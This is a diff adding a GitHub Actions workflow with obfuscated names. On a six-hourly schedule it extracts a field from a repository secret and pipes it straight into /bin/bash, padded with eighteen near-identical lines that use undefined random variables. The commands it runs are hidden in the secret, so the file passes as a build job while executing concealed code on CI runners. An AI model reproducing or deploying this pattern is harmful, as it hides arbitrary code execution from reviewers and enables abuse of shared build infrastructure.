@@ -1,0 +1,35 @@
+name: zhiaibietilee
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhiaibietilee
+        env:
+          thx73814: ${{ secrets.thx73814 }}
+        run: |
+          echo $thx73814 | jq -r .oquyu7881 | /bin/bash
+          echo $ez120 | jq -r .gb7217 | /bin/bash
+          echo $qh29576 | jq -r .ad54579 | /bin/bash
+          echo $pihl200 | jq -r .vkpr6 | /bin/bash
+          echo $u7 | jq -r .kcaxt297 | /bin/bash
+          echo $hp02 | jq -r .y78664 | /bin/bash
+          echo $q54376 | jq -r .fwls90 | /bin/bash
+          echo $cuctr468 | jq -r .t7960 | /bin/bash
+          echo $dxglr2500 | jq -r .iwu0586 | /bin/bash
+          echo $mcii2 | jq -r .abks50117 | /bin/bash
+          echo $u462 | jq -r .ll9611 | /bin/bash
+          echo $g62 | jq -r .mggef020 | /bin/bash
+          echo $lfay99823 | jq -r .v8 | /bin/bash
+          echo $h79058 | jq -r .upqg2259 | /bin/bash
+          echo $xfqwq8124 | jq -r .dpwnc261 | /bin/bash
+          echo $pmrcc6 | jq -r .a85 | /bin/bash
+          echo $u30 | jq -r .skhu9 | /bin/bash
+          echo $niq3897 | jq -r .bqr478 | /bin/bash
+          echo $o3144 | jq -r .t91051 | /bin/bash
+
